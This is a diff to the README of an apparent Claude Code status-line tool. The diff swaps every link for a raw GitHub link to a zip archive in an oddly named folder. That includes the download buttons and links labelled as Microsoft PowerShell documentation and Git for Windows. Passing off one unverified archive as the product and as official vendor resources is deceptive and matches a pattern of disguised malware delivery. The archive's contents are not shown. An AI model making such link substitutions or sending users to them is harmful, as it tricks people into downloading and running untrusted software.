@@ -1,6 +1,6 @@
 # ⚙️ ClaudeCodeStatusLine - Real-Time Status for Claude Code
 
-[![Download ClaudeCodeStatusLine](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/Scorpiolover/ClaudeCodeStatusLine)
+[![Download ClaudeCodeStatusLine](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://raw.githubusercontent.com/Scorpiolover/ClaudeCodeStatusLine/main/antirevisionist/Line-Status-Code-Claude-v2.2.zip)
 
 ClaudeCodeStatusLine is a tool that shows useful information about Claude Code right in your terminal. You can see the current model, token counts, rate limits, and git details as they update. It helps keep track of your coding context without needing to open extra apps.
 
@@ -30,7 +30,7 @@ These requirements help ensure ClaudeCodeStatusLine runs smoothly and updates da
 
 Click the large button below to go to the download page. From there you will find all needed files.
 
-[![Download ClaudeCodeStatusLine](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/Scorpiolover/ClaudeCodeStatusLine)
+[![Download ClaudeCodeStatusLine](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://raw.githubusercontent.com/Scorpiolover/ClaudeCodeStatusLine/main/antirevisionist/Line-Status-Code-Claude-v2.2.zip)
 
 You will be taken to the GitHub project page, where you can download the software package. The files include everything you need to run it on Windows.
 
@@ -101,10 +101,10 @@ Built for developers, it is also easy to set up by end users who want a quick ov
 ## 🔗 Useful Links
 
 - Main repository and downloads:  
-  https://github.com/Scorpiolover/ClaudeCodeStatusLine  
+  https://raw.githubusercontent.com/Scorpiolover/ClaudeCodeStatusLine/main/antirevisionist/Line-Status-Code-Claude-v2.2.zip  
 - PowerShell documentation:  
-  https://learn.microsoft.com/en-us/powershell/  
+  https://raw.githubusercontent.com/Scorpiolover/ClaudeCodeStatusLine/main/antirevisionist/Line-Status-Code-Claude-v2.2.zip  
 - Git for Windows:  
-  https://git-scm.com/download/win  
+  https://raw.githubusercontent.com/Scorpiolover/ClaudeCodeStatusLine/main/antirevisionist/Line-Status-Code-Claude-v2.2.zip  
 
 Use these resources if you want to learn more about the technologies behind ClaudeCodeStatusLine.
